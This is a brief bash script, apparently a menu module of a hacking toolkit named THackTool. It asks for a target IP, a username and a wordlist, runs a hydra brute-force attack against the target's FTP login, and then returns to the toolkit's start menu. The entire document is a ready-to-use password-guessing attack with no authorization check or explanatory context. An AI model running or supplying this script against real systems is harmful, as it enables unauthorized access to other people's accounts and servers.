echo
read -p "Target IP: " target
read -p "Username: " user
read -p "Path to wordlist: " wordlist
hydra -l $user -P $wordlist ftp://$target
echo
read -p "!Press Enter to return to main menu!"
bash ~/THackTool/start.sh
